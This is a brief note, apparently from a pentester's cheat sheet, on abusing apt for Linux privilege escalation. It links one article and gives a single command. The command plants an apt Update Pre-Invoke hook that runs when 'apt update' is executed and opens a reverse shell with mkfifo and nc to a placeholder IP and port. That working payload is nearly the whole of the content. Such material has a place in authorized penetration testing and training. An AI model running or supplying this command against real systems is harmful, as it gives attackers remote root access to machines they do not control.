# APT
#apt

Good list: https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/

`echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f"};' > pwn;apt update`